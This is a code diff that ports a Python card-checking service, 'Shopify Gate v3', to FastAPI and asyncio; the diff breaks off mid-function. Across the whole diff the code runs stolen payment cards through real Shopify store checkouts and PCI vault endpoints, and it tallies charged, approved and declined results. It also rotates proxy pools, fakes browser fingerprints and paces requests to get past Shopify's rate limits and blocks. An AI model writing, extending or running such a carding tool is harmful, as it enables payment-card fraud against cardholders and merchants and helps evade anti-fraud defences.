@@ -1,134 +1,94 @@
 #!/usr/bin/env python3
 """
-Shopify Gate v3 — fresh build.
-Lean flow: discovery -> checkout init -> 2 proposals -> PCI (4 vaults) ->
-submit (renegotiation+retries) -> poll verdict.
-Fallback transport: /checkouts/unstable/graphql with full documents.
+Shopify Gate v3 — async port of the original kali_api pipeline.
+
+Same flow, same constants, same verdict mapping as main_legacy.py:
+  discovery -> checkout init -> 2 proposals -> PCI (4 vaults) ->
+  submit (renegotiation+retries) -> poll verdict.
+
+Only the plumbing changed:
+  flask + sync curl_cffi  ->  FastAPI/uvicorn + curl_cffi AsyncSession
+  threads                 ->  asyncio tasks (a check waiting on a socket
+                              does not pin a thread)
+
+Proxy handling is the unified one (normalize_proxy below): every shape the
+bot pool, the webshop lists and the old API accept — "user pass ip port",
+"ip:port:user:pass", "user:pass@ip:port", socks4/5, [v6]:port, v7's '+'
+separator — is turned into a proper URL before it reaches curl.
 """
+import asyncio
 import base64
-import concurrent.futures
 import hmac
 import html as htmllib
 import json
 import os
 import random
 import re
-import threading
 import time
 import urllib.parse
 
-from flask import Flask, request, jsonify
 from curl_cffi import requests as curl_requests
+from fastapi import FastAPI, Request, Query
+from fastapi.responses import JSONResponse
+import uvicorn
 
 import config as CFG
 
-app = Flask(__name__)
-
+# ── config ────────────────────────────────────────────────────────────────
 HOST = CFG.HOST
 PORT = int(CFG.PORT)
-
-import config as CFG
-
-API_KEYS  = list(CFG.API_KEYS)
-THREADS   = max(1, int(CFG.THREADS))
+API_KEYS = list(CFG.API_KEYS)
 SITES_FILE = CFG.SITES_FILE
+SITE_MODE = str(CFG.SITE_MODE).lower()
+LOAD_MAX = float(CFG.LOAD_MAX_PERCENT)
+LOAD_TTL = float(CFG.LOAD_TTL_SECONDS)
+QUEUE_WAIT = int(CFG.QUEUE_WAIT)
+CAPACITY_POLL = max(0.25, float(CFG.CAPACITY_POLL))
+REQUEST_TIMEOUT = float(CFG.REQUEST_TIMEOUT)
 
-# MAX_CONCURRENCY > 0 -> hard semaphore. 0 -> no cap, but new checks are
-# refused once the box crosses LOAD_MAX_PERCENT (cpu or ram, whichever is worse).
-if int(CFG.MAX_CONCURRENCY) > 0:
-    _SEM = threading.BoundedSemaphore(int(CFG.MAX_CONCURRENCY))
-else:
-    _SEM = None
+SLOTS = int(CFG.MAX_CONCURRENCY) or max(1, int(CFG.THREADS))
+_slots = asyncio.Semaphore(SLOTS)
+
+_stats = {"active": 0, "total": 0, "charged": 0, "approved": 0,
+          "pending": 0, "declined": 0, "errors": 0,
+          "started": time.strftime("%Y-%m-%d %H:%M:%S")}
 
 _load_cache = {"ts": 0.0, "pct": 0.0}
+_sites_cache = {"ts": 0.0, "sites": []}
+
+
+# runtime state used by the ported pipeline
+_SHOP_PACE = {}
+_PROXY_HEALTH = {}
 
 
 def _load_pct() -> float:
-    """Worst of CPU load (1m avg / cores) and RAM use, in percent."""
     now = time.time()
-    if now - _load_cache["ts"] < int(CFG.LOAD_TTL_SECONDS):
+    if now - _load_cache["ts"] < LOAD_TTL:
         return _load_cache["pct"]
     pct = 0.0
     try:
         import psutil
-        pct = max(psutil.cpu_percent(interval=0.0),
-                  psutil.virtual_memory().percent)
+        pct = max(psutil.cpu_percent(interval=0.0), psutil.virtual_memory().percent)
     except Exception:
         try:
             cores = os.cpu_count() or 1
-            load1 = os.getloadavg()[0]
-            cpu_pct = (load1 / cores) * 100.0
-            mem_pct = 0.0
+            cpu = (os.getloadavg()[0] / cores) * 100.0
+            info = {}
             with open("/proc/meminfo") as f:
-                info = {}
                 for line in f:
-                    k2, _, rest = line.partition(":")
-                    info[k2.strip()] = rest.strip().split()[0]
+                    k, _, rest = line.partition(":")
+                    info[k.strip()] = rest.strip().split()[0]
             total = float(info.get("MemTotal", 1) or 1)
             avail = float(info.get("MemAvailable", 0) or 0)
-            mem_pct = (1.0 - avail / total) * 100.0
-            pct = max(cpu_pct, mem_pct)
+            pct = max(cpu, (1.0 - avail / total) * 100.0)
         except Exception:
             pct = 0.0
     _load_cache.update(ts=now, pct=pct)
     return pct
 
 
-def _acquire_slot() -> bool:
-    """Get permission to run one check.
-
-    MAX_CONCURRENCY > 0 : wait for a free semaphore slot.
-    MAX_CONCURRENCY = 0 : wait while the box is at/above LOAD_MAX_PERCENT.
-
-    QUEUE_WAIT = 0 means "wait as long as it takes"; a positive value gives up
-    after that many seconds (-> 503 SERVER_BUSY).
-    """
-    wait = int(CFG.QUEUE_WAIT)
-    timeout = None if wait <= 0 else wait
-
-    if _SEM is not None:
-        return _SEM.acquire(timeout=timeout)
-
-    limit = float(CFG.LOAD_MAX_PERCENT)
-    poll = max(0.25, float(CFG.CAPACITY_POLL))
-    started = time.time()
-    if _load_pct() < limit:
-        return True
-
-    # box is hot: park here until it cools, without burning cpu
-    while _load_pct() >= limit:
-        if wait > 0 and (time.time() - started) >= wait:
-            return False
-        time.sleep(poll)
-    return True
-
-
-def _release_slot() -> None:
-    if _SEM is not None:
-        _SEM.release()
-
-
-def _key_ok(candidate) -> bool:
-    cand = str(candidate or "")
-    return any(hmac.compare_digest(cand, str(k)) for k in API_KEYS)
-
-
-_stats = {"active": 0, "total": 0, "charged": 0, "approved": 0,
-          "pending": 0, "declined": 0, "errors": 0,
-          "started": time.strftime("%Y-%m-%d %H:%M:%S")}
-_stats_lock = threading.Lock()
-
-# one worker per thread; a check that blows REQUEST_TIMEOUT stops holding the
-# slot, its thread finishes in the background
-_EXEC = concurrent.futures.ThreadPoolExecutor(
-    max_workers=int(CFG.MAX_CONCURRENCY) if int(CFG.MAX_CONCURRENCY) > 0 else THREADS,
-    thread_name_prefix="chk")
-
-_sites_cache = {"ts": 0.0, "sites": []}
-
-
 def _load_sites():
-    """SITES_FILE lines, cached on mtime (edit the file, no restart)."""
     try:
         st = os.stat(SITES_FILE)
     except OSError:
@@ -156,29 +116,132 @@ def _pick_site():
     return random.choice(sites) if sites else ""
 
 
-def _v2_shape(payload, site, proxy_status):
-    """v2/main_v2.py response contract."""
-    p = dict(payload or {})
-    p["Proxy"] = "Live" if str(proxy_status).lower() == "live" else "Dead"
-    p["site"] = site or ""
-    p.setdefault("Gateway", "Shopify Payments")
-    p.setdefault("Currency", "USD")
-    p.setdefault("Price", "0.00")
-    p.setdefault("Status", "false")
-    p.setdefault("CC", "")
-    return p
+def _key_ok(candidate) -> bool:
+    cand = str(candidate or "")
+    return any(hmac.compare_digest(cand, str(k)) for k in API_KEYS)
 
 
-_SHOP_PACE = {}
+async def _acquire():
+    deadline = None if QUEUE_WAIT <= 0 else time.time() + QUEUE_WAIT
+    while _load_pct() >= LOAD_MAX:
+        if deadline is not None and time.time() >= deadline:
+            return False
+        await asyncio.sleep(CAPACITY_POLL)
+    try:
+        if deadline is None:
+            await _slots.acquire()
+        else:
+            await asyncio.wait_for(_slots.acquire(), timeout=max(0.1, deadline - time.time()))
+    except asyncio.TimeoutError:
+        return False
+    return True
 
 
-def _pace(shop_url):
+# ── proxy normalisation (unified) ─────────────────────────────────────────
+def normalize_proxy(raw: str) -> str:
+    """Every shape the bot pool / webshop lists / v7 accept -> a URL."""
+    p = (raw or "").strip()
+    if not p:
+        raise ValueError("empty proxy")
+    scheme = "http"
+    m = re.match(r"^(https?|socks4|socks5)://", p, re.I)
+    if m:
+        scheme = m.group(1).lower()
+        p = p[m.end():]
+    p = p.strip().strip("\"'<>;, ").lstrip("@").strip()
+    if "@" not in p and "+" in p:
+        p = p.replace("+", ":")
+
+    def _host_port(hp):
+        hp = hp.strip().rstrip("/")
+        if hp.startswith("[") and "]" in hp:
+            host, _, port = hp.partition("]")
+            host, port = host.strip("[]"), port.lstrip(":")
+            return (host, port) if host and port.isdigit() else None
+        if hp.count(":") == 1:
+            host, _, port = hp.partition(":")
+            if host and port.isdigit():
+                return host, port
+        return None
+
+    def _build(user, pwd, hostport):
+        hp = _host_port(hostport)
+        if not hp:
+            raise ValueError(f"invalid proxy format: {raw}")
+        host, port = hp
+        hostport = f"[{host}]:{port}" if ":" in host else f"{host}:{port}"
+        if user:
+            user = urllib.parse.unquote(user)
+            pwd = urllib.parse.unquote(pwd or "")
+            return (f"{scheme}://{urllib.parse.quote(user, safe='')}:"
+                    f"{urllib.parse.quote(pwd, safe='')}@{hostport}")
+        return f"{scheme}://{hostport}"
+
+    if "@" in p:
+        userinfo, _, hostport = p.rpartition("@")
+        user, _, pwd = userinfo.partition(":")
+        return _build(user, pwd, hostport)
+
+    toks = [x for x in re.split(r"\s+", p) if x]
+    if len(toks) == 4:
+        a, b, c, d = toks
+
+        def _port(x):
+            return x.isdigit() and 0 < int(x) <= 65535
+
+        def _host(x):
+            return ("." in x) or x.startswith("[") or not x.isdigit()
+
+        sa = int(_port(b) and _host(a)) + int("." in a)
+        sb = int(_port(d) and _host(c)) + int("." in c)
+        if sa >= sb and _port(b):
+            return _build(c, d, f"{a}:{b}")
+        if _port(d):
+            return _build(a, b, f"{c}:{d}")
+        raise ValueError(f"invalid proxy format: {raw}")
+    if len(toks) == 3:
+        if _host_port(toks[0]):
+            return _build(toks[1], toks[2], toks[0])
+        if _host_port(toks[2]):
+            return _build(toks[0], toks[1], toks[2])
+        raise ValueError(f"invalid proxy format: {raw}")
+    if len(toks) == 2:
+        if _host_port(toks[1]):
+            u, _, pw = toks[0].partition(":")
+            return _build(u, pw, toks[1])
+        if toks[1].isdigit() and "." in toks[0]:
+            return _build("", "", f"{toks[0]}:{toks[1]}")
+        if _host_port(toks[0]):
+            u, _, pw = toks[1].partition(":")
+            return _build(u, pw, toks[0])
+        return _build("", "", toks[0])
+    parts = p.split(":")
+    if len(parts) == 2:
+        return _build("", "", p)
+    if len(parts) == 4:
+        if parts[1].isdigit():
+            return _build(parts[2], parts[3], f"{parts[0]}:{parts[1]}")
+        return _build(parts[0], parts[1], f"{parts[2]}:{parts[3]}")
+    return _build("", "", p)
+
+
+def _norm_proxy(p):
+    p = (p or "").strip()
+    if not p:
+        return p
+    try:
+        return normalize_proxy(p)
+    except Exception:
+        return p
+
+
+async def _pace(shop_url):
     """Space repeat hits to the same shop so bursts don't trip Shopify's wall."""
     now = time.time()
     last = _SHOP_PACE.get(shop_url, 0)
     wait = 0.9 - (now - last)
     if wait > 0:
-        time.sleep(wait)
+        await asyncio.sleep(wait)
     _SHOP_PACE[shop_url] = time.time()
 
 BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0"]
@@ -270,68 +333,6 @@ STOREFRONT_TOKEN_PATTERNS = [
 ]
 
 
-def _norm_proxy(p):
-    p = (p or "").strip()
-    if not p:
-        return p
-    if not re.match(r"^[a-z][a-z0-9+.-]*://", p, re.IGNORECASE):
-        p = "http://" + p
-    return p
-
-
-_PROXY_HEALTH = {}
-
-
-def _proxy_ok(proxy, probe_url, timeout=2):
-    hit = _PROXY_HEALTH.get(proxy)
-    if hit and time.time() - hit[1] < 30:
-        return hit[0]
-    ok = False
-    try:
-        with curl_requests.Session(impersonate="chrome124") as s:
-            s.timeout = timeout
-            s.proxies = {"http": proxy, "https": proxy}
-            r = s.get(probe_url, timeout=timeout)
-            ok = r.status_code < 600
-    except Exception:
-        ok = False
-    _PROXY_HEALTH[proxy] = (ok, time.time())
-    return ok
-
-
-def _post_retry(session, url, proxies=None, timeout=10, attempts=2, **kw):
-    plist = [_norm_proxy(p) for p in (proxies or []) if _norm_proxy(p)]
-    if plist:
-        plist.append(None)
-    else:
-        plist = [None]
-    last = None
-    for i in range(attempts):
-        pxy = plist[i % len(plist)]
-        try:
-            r = session.post(url, proxy=pxy, timeout=timeout, **kw)
-            return r.status_code, r.text
-        except Exception as e:
-            last = e
-            time.sleep(0.1)
-    return 0, f"__NETERR__:{str(last)[:120]}"
-
-
-def _get_retry(session, url, proxies=None, timeout=10, **kw):
-    plist = [_norm_proxy(p) for p in (proxies or []) if _norm_proxy(p)]
-    if plist:
-        plist.append(None)
-    else:
-        plist = [None]
-    last = None
-    for pxy in plist:
-        try:
-            r = session.get(url, proxy=pxy, timeout=timeout, **kw)
-            return r.status_code, r.text
-        except Exception as e:
-            last = e
-    return 0, f"__NETERR__:{str(last)[:120]}"
-
 
 def _extract(s, regex, group=1):
     m = re.search(regex, s or "")
@@ -357,16 +358,16 @@ def random_address(country="US"):
     }
 
 
-def fetch_store_currency(shop_url, proxy=None):
+async def fetch_store_currency(shop_url, proxy=None):
     if shop_url in _currency_cache:
         return _currency_cache[shop_url]
     for p in (_norm_proxy(proxy) if proxy else None, None):
         try:
-            with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as s:
+            async with curl_requests.AsyncSession(impersonate=random.choice(BROWSER_PROFILES)) as s:
                 s.timeout = 10
                 if p:
                     s.proxies = {"http": p, "https": p}
-                r = s.get(f"{shop_url}/payments/config.json")
+                r = await s.get(f"{shop_url}/payments/config.json")
                 if r.status_code == 200:
                     d = r.json()
                     pi = d.get("paymentInstruments", {})
@@ -420,10 +421,61 @@ def _edges_to_candidates(edges, min_price, max_price):
     return candidates[0]
 
 
-def _fetch_storefront_token(session, shop_url):
+async def _proxy_ok(proxy, probe_url, timeout=2):
+    hit = _PROXY_HEALTH.get(proxy)
+    if hit and time.time() - hit[1] < 30:
+        return hit[0]
+    ok = False
+    try:
+        async with curl_requests.AsyncSession(impersonate="chrome124") as s:
+            s.timeout = timeout
+            s.proxies = {"http": proxy, "https": proxy}
+            r = await s.get(probe_url, timeout=timeout)
+            ok = r.status_code < 600
+    except Exception:
+        ok = False
+    _PROXY_HEALTH[proxy] = (ok, time.time())
+    return ok
+
+
+async def _post_retry(session, url, proxies=None, timeout=10, attempts=2, **kw):
+    plist = [_norm_proxy(p) for p in (proxies or []) if _norm_proxy(p)]
+    if plist:
+        plist.append(None)
+    else:
+        plist = [None]
+    last = None
+    for i in range(attempts):
+        pxy = plist[i % len(plist)]
+        try:
+            r = await session.post(url, proxy=pxy, timeout=timeout, **kw)
+            return r.status_code, r.text
+        except Exception as e:
+            last = e
+            await asyncio.sleep(0.1)
+    return 0, f"__NETERR__:{str(last)[:120]}"
+
+
+async def _get_retry(session, url, proxies=None, timeout=10, **kw):
+    plist = [_norm_proxy(p) for p in (proxies or []) if _norm_proxy(p)]
+    if plist:
+        plist.append(None)
+    else:
+        plist = [None]
+    last = None
+    for pxy in plist:
+        try:
+            r = await session.get(url, proxy=pxy, timeout=timeout, **kw)
+            return r.status_code, r.text
+        except Exception as e:
+            last = e
+    return 0, f"__NETERR__:{str(last)[:120]}"
+
+
+async def _fetch_storefront_token(session, shop_url):
     for path in ("/cart", "/", "/collections/all"):
         try:
-            r = session.get(shop_url + path, allow_redirects=True)
+            r = await session.get(shop_url + path, allow_redirects=True)
             body = r.text or ""
             for pat in STOREFRONT_TOKEN_PATTERNS:
                 m = pat.search(body)
@@ -434,16 +486,16 @@ def _fetch_storefront_token(session, shop_url):
     return ""
 
 
-def _find_token_gql(session, shop_url, min_price, max_price, tok=None):
+async def _find_token_gql(session, shop_url, min_price, max_price, tok=None):
     if tok is None:
-        tok = _fetch_storefront_token(session, shop_url)
+        tok = await _fetch_storefront_token(session, shop_url)
     if not tok:
         return None
     edges = []
     cursor = None
     for _ in range(3):
         try:
-            r = session.post(f"{shop_url}/api/unstable/graphql.json",
+            r = await session.post(f"{shop_url}/api/unstable/graphql.json",
                              json={"query": TOKEN_GQL_SORTED_QUERY, "variables": {"first": 100, "cursor": cursor}},
                              headers={"content-type": "application/json", "accept": "application/json",
                                       "x-shopify-storefront-access-token": tok, "origin": shop_url,
@@ -462,14 +514,14 @@ def _find_token_gql(session, shop_url, min_price, max_price, tok=None):
     return _edges_to_candidates(edges, min_price, max_price) if edges else None
 
 
-def _find_unstable_gql(session, shop_url, min_price, max_price, tok=""):
+async def _find_unstable_gql(session, shop_url, min_price, max_price, tok=""):
     headers = {"content-type": "application/json", "accept": "application/json",
                "x-shopify-schema-handle": "storefront", "x-shopify-version-handle": "unstable",
                "origin": shop_url, "referer": shop_url + "/", "user-agent": random.choice(USER_AGENTS)}
     if tok:
         headers["x-shopify-storefront-access-token"] = tok
     try:
-        r = session.post(f"{shop_url}/api/unstable/graphql.json", data=STOREFRONT_GQL_QUERY, headers=headers)
+        r = await session.post(f"{shop_url}/api/unstable/graphql.json", data=STOREFRONT_GQL_QUERY, headers=headers)
         if r.status_code != 200:
             return None
         return _edges_to_candidates(r.json().get("data", {}).get("products", {}).get("edges", []), min_price, max_price)
@@ -477,16 +529,16 @@ def _find_unstable_gql(session, shop_url, min_price, max_price, tok=""):
         return None
 
 
-def _find_versioned_gql(session, shop_url, min_price, max_price, tok=""):
+async def _find_versioned_gql(session, shop_url, min_price, max_price, tok=""):
     if not tok:
-        tok = _fetch_storefront_token(session, shop_url)
+        tok = await _fetch_storefront_token(session, shop_url)
     for ver in ("2025-01", "2024-10", "2024-07", "2024-01", "2026-01", "2026-04"):
         headers = {"content-type": "application/json", "accept": "application/json",
                    "origin": shop_url, "referer": shop_url + "/", "user-agent": random.choice(USER_AGENTS)}
         if tok:
             headers["x-shopify-storefront-access-token"] = tok
         try:
-            r = session.post(f"{shop_url}/api/{ver}/graphql.json", data=STOREFRONT_GQL_QUERY, headers=headers)
+            r = await session.post(f"{shop_url}/api/{ver}/graphql.json", data=STOREFRONT_GQL_QUERY, headers=headers)
             if r.status_code != 200:
                 continue
             res = _edges_to_candidates(r.json().get("data", {}).get("products", {}).get("edges", []), min_price, max_price)
@@ -497,9 +549,9 @@ def _find_versioned_gql(session, shop_url, min_price, max_price, tok=""):
     return None
 
 
-def _find_collections_json(session, shop_url, min_price, max_price):
+async def _find_collections_json(session, shop_url, min_price, max_price):
     try:
-        r = session.get(f"{shop_url}/collections/all/products.json?limit=250",
+        r = await session.get(f"{shop_url}/collections/all/products.json?limit=250",
                         headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
         if r.status_code != 200:
             return None
@@ -528,9 +580,9 @@ def _find_collections_json(session, shop_url, min_price, max_price):
     return best
 
 
-def _find_search_suggest(session, shop_url, min_price, max_price):
+async def _find_search_suggest(session, shop_url, min_price, max_price):
     try:
-        r = session.get(f"{shop_url}/search/suggest.json?q=*&resources[type]=product&resources[limit]=10",
+        r = await session.get(f"{shop_url}/search/suggest.json?q=*&resources[type]=product&resources[limit]=10",
                         headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
         if r.status_code != 200:
             return None
@@ -540,7 +592,7 @@ def _find_search_suggest(session, shop_url, min_price, max_price):
     best = None
     for h in handles:
         try:
-            r = session.get(f"{shop_url}/products/{h}.json", headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
+            r = await session.get(f"{shop_url}/products/{h}.json", headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
             if r.status_code != 200:
                 continue
             pdata = r.json().get("product", {})
@@ -565,9 +617,9 @@ def _find_search_suggest(session, shop_url, min_price, max_price):
     return best
 
 
-def _find_sitemap(session, shop_url, min_price, max_price):
+async def _find_sitemap(session, shop_url, min_price, max_price):
     try:
-        r = session.get(f"{shop_url}/sitemap_products_1.xml", headers={"accept": "text/xml,*/*", "user-agent": random.choice(USER_AGENTS)})
+        r = await session.get(f"{shop_url}/sitemap_products_1.xml", headers={"accept": "text/xml,*/*", "user-agent": random.choice(USER_AGENTS)})
         if r.status_code != 200:
             return None
         handles = list(dict.fromkeys(re.findall(r"/products/([A-Za-z0-9_-]+)", r.text)))[:30]
@@ -576,7 +628,7 @@ def _find_sitemap(session, shop_url, min_price, max_price):
     best = None
     for h in handles:
         try:
-            r = session.get(f"{shop_url}/products/{h}.json", headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
+            r = await session.get(f"{shop_url}/products/{h}.json", headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
             if r.status_code != 200:
                 continue
             pdata = r.json().get("product", {})
@@ -601,23 +653,23 @@ def _find_sitemap(session, shop_url, min_price, max_price):
     return best
 
 
-def _discover_products(shop_url, proxy, min_price, max_price):
+async def _discover_products(shop_url, proxy, min_price, max_price):
     proxy_url = _norm_proxy(proxy or None)
-    with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as session:
+    async with curl_requests.AsyncSession(impersonate=random.choice(BROWSER_PROFILES)) as session:
         session.timeout = 10
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
-        tok = _fetch_storefront_token(session, shop_url)
+        tok = await _fetch_storefront_token(session, shop_url)
         for fn in (_find_token_gql, _find_unstable_gql, _find_versioned_gql):
             try:
-                r = fn(session, shop_url, min_price, max_price, tok)
+                r = await fn(session, shop_url, min_price, max_price, tok)
                 if r:
                     return r
             except Exception:
                 continue
         for fn in (_find_collections_json, _find_search_suggest, _find_sitemap):
             try:
-                r = fn(session, shop_url, min_price, max_price)
+                r = await fn(session, shop_url, min_price, max_price)
                 if r:
                     return r
             except Exception:
@@ -625,21 +677,21 @@ def _discover_products(shop_url, proxy, min_price, max_price):
     return None
 
 
-def find_cheapest_product(shop_url, proxy=None, min_price=0.50, max_price=0.0):
+async def find_cheapest_product(shop_url, proxy=None, min_price=0.50, max_price=0.0):
     key = (shop_url, min_price, max_price)
     cached = _PRODUCT_CACHE.get(key)
     if cached and time.time() - cached[0] < 300:
         return cached[1]
-    r = _discover_products(shop_url, proxy, min_price, max_price)
+    r = await _discover_products(shop_url, proxy, min_price, max_price)
     if not r and proxy:
-        r = _discover_products(shop_url, None, min_price, max_price)
+        r = await _discover_products(shop_url, None, min_price, max_price)
     if r:
         _PRODUCT_CACHE[key] = (time.time(), r)
     return r
 
 
-def _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url):
-    tok = _fetch_storefront_token(session, shop_url)
+async def _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url):
+    tok = await _fetch_storefront_token(session, shop_url)
     headers = {"content-type": "application/json", "accept": "application/json",
                "origin": shop_url, "referer": shop_url + "/", "user-agent": random.choice(USER_AGENTS)}
     if tok:
@@ -651,7 +703,7 @@ def _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url):
     }"""
     for ver in ("2024-01", "2025-01", "2026-01"):
         try:
-            r = session.post(f"{shop_url}/api/{ver}/graphql.json",
+            r = await session.post(f"{shop_url}/api/{ver}/graphql.json",
                              json={"query": mutation, "variables": {
                                  "input": {"lines": [{"merchandiseId": gid, "quantity": 1}],
                                            "buyerIdentity": {"countryCode": country}},
@@ -667,9 +719,9 @@ def _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url):
     return ""
 
 
-def _checkout_init(session, shop_url, variant_id, country, proxy_url):
+async def _checkout_init(session, shop_url, variant_id, country, proxy_url):
     try:
-        r = session.get(f"{shop_url}/cart/{variant_id}:1", allow_redirects=True,
+        r = await session.get(f"{shop_url}/cart/{variant_id}:1", allow_redirects=True,
                         headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                  "accept-language": "en-US,en;q=0.9", "referer": shop_url + "/",
                                  "user-agent": random.choice(USER_AGENTS)}, proxy=proxy_url)
@@ -679,17 +731,17 @@ def _checkout_init(session, shop_url, variant_id, country, proxy_url):
     except Exception:
         pass
     try:
-        session.post(f"{shop_url}/cart/add.js", json={"id": variant_id, "quantity": 1}, proxy=proxy_url)
-        r = session.get(f"{shop_url}/checkout", allow_redirects=True, proxy=proxy_url)
+        await session.post(f"{shop_url}/cart/add.js", json={"id": variant_id, "quantity": 1}, proxy=proxy_url)
+        r = await session.get(f"{shop_url}/checkout", allow_redirects=True, proxy=proxy_url)
         html = r.text
         if "/checkouts/cn/" in str(r.url) and "serialized-sessionToken" in html:
             return str(r.url), html
     except Exception:
         pass
     try:
-        cu = _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url)
+        cu = await _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url)
         if cu:
-            r = session.get(cu, allow_redirects=True, proxy=proxy_url)
+            r = await session.get(cu, allow_redirects=True, proxy=proxy_url)
             html = r.text
             if "/checkouts/cn/" in str(r.url) and "serialized-sessionToken" in html:
                 return str(r.url), html
@@ -806,22 +858,22 @@ def _build_proposal_variables(session_token, queue_token, stable_id, variant_id,
     }
 
 
-def _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
+async def _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, variables, proposal_id=None, proxies=None):
     pid = proposal_id or PROPOSAL_ID
     payload = json.dumps({"variables": variables, "operationName": "Proposal", "id": pid})
     url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
     headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
     for _ in range(3):
-        status, body = _post_retry(session, url, proxies=proxies, data=payload, headers=headers)
+        status, body = await _post_retry(session, url, proxies=proxies, data=payload, headers=headers)
         if status in (429, 403) or status >= 500:
-            time.sleep(random.uniform(1.0, 1.6))
+            await asyncio.sleep(random.uniform(1.0, 1.6))
             continue
         return status, body
     doc = _GQL.get("proposal")
     if doc:
         fb = json.dumps({"operationName": "Proposal", "variables": variables, "query": doc})
-        return _post_retry(session, f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal",
+        return await _post_retry(session, f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal",
                            proxies=proxies, data=fb, headers=headers)
     return status, body
 
@@ -1021,7 +1073,7 @@ def _is_challenge_html(body):
             or ("challenge" in b[:300] and '"id"' not in b))
 
 
-def _send_pci(session, ident_sig, card, name, shop_domain, vault_url="", vault_domain="", proxy=None, build_hash="", proxies=None):
+async def _send_pci(session, ident_sig, card, name, shop_domain, vault_url="", vault_domain="", proxy=None, build_hash="", proxies=None):
     scope = vault_domain or (shop_domain.replace("https://", "").replace("http://", "").split("/")[0] if shop_domain else "")
     shop_key = scope or shop_domain
     plist = [_norm_proxy(p) for p in (proxies or []) if _norm_proxy(p)]
@@ -1056,7 +1108,7 @@ def _send_pci(session, ident_sig, card, name, shop_domain, vault_url="", vault_d
         "issue_number": "", "name": name,
     }, "payment_session_scope": scope})
 
-    def _try(ep, pxy):
+    async def _try(ep, pxy):
         origin = ep.rsplit("/sessions", 1)[0]
         headers = {
             "accept": "application/json",
@@ -1074,12 +1126,12 @@ def _send_pci(session, ident_sig, card, name, shop_domain, vault_url="", vault_d
             "user-agent": random.choice(USER_AGENTS),
         }
         try:
-            r = session.post(ep, data=payload, headers=headers, proxy=pxy, timeout=10)
+            r = await session.post(ep, data=payload, headers=headers, proxy=pxy, timeout=10)
             return r.status_code, r.text
         except Exception as e:
             return 0, f"__NETERR__:{str(e)[:120]}"
 
-    time.sleep(random.uniform(0.05, 0.25))
+    await asyncio.sleep(random.uniform(0.05, 0.25))
     last_status, last_body = 0, ""
     lanes = [p for p in plist if not _lane_cooling(p)]
     if not lanes:
@@ -1087,7 +1139,7 @@ def _send_pci(session, ident_sig, card, name, shop_domain, vault_url="", vault_d
     for _round in range(2):
         for pxy in lanes:
             for ep in candidates:
-                status, body = _try(ep, pxy)
+                status, body = await _try(ep, pxy)
                 if status == 200 and '"id"' in (body or ""):
                     if _round == 0:
                         _VAULT_CACHE[shop_key] = ep
@@ -1100,10 +1152,10 @@ def _send_pci(session, ident_sig, card, name, shop_domain, vault_url="", vault_d
                     _lane_burn(pxy, 60 if status == 403 else PCI_BURN_SECONDS)
                     break
                 if status == 429:
-                    time.sleep(random.uniform(0.4, 0.8))
+                    await asyncio.sleep(random.uniform(0.4, 0.8))
                     break
         if _round == 0:
-            time.sleep(0.5)
+            await asyncio.sleep(0.5)
             lanes = [p for p in lanes if not _lane_cooling(p)]
             if not lanes:
                 break
@@ -1228,25 +1280,25 @@ def _extract_any_error(body):
     return ""
 
 
-def persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, checkout_url_override="", dynamic_ids=True, proxies=None):
+async def persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, checkout_url_override="", dynamic_ids=True, proxies=None):
     variant_id = variant["variant_id"]
     price = f"{variant['price']:.2f}"
     proxy_url = _norm_proxy(proxy or None)
     plist = [_norm_proxy(p) for p in proxies] if proxies else ([proxy_url] if proxy_url else None)
 
-    with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as session:
+    async with curl_requests.AsyncSession(impersonate=random.choice(BROWSER_PROFILES)) as session:
         session.timeout = 10
         checkout_url, checkout_html = "", ""
 
         if checkout_url_override:
             try:
-                r = session.get(checkout_url_override, allow_redirects=True, proxy=proxy_url)
+                r = await session.get(checkout_url_override, allow_redirects=True, proxy=proxy_url)
                 checkout_url, checkout_html = str(r.url), r.text
             except Exception:
                 pass
 
         if "/checkouts/cn/" not in checkout_url or "serialized-sessionToken" not in checkout_html:
-            checkout_url, checkout_html = _checkout_init(session, shop_url, variant_id, country, proxy_url)
+            checkout_url, checkout_html = await _checkout_init(session, shop_url, variant_id, country, proxy_url)
 
         checkout_token = _extract(checkout_url, r'/checkouts/cn/([^/?]+)')
         session_token = htmllib.unescape(_extract(checkout_html, r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"')).strip('"')
@@ -1273,7 +1325,7 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
                     proposal_id, submit_id, poll_id = _ID_CACHE[actions_url]
                 else:
                     try:
-                        js_body = session.get(actions_url, headers={
+                        js_body = await session.get(actions_url, headers={
                             "accept": "*/*", "origin": shop_url, "referer": checkout_url,
                             "user-agent": random.choice(USER_AGENTS)}, proxy=proxy_url).text
                         _p = _extract_js_id(js_body, "Proposal", "query")
@@ -1293,7 +1345,7 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
         captcha = None
 
         # proposal 1 — queue token + currency/country
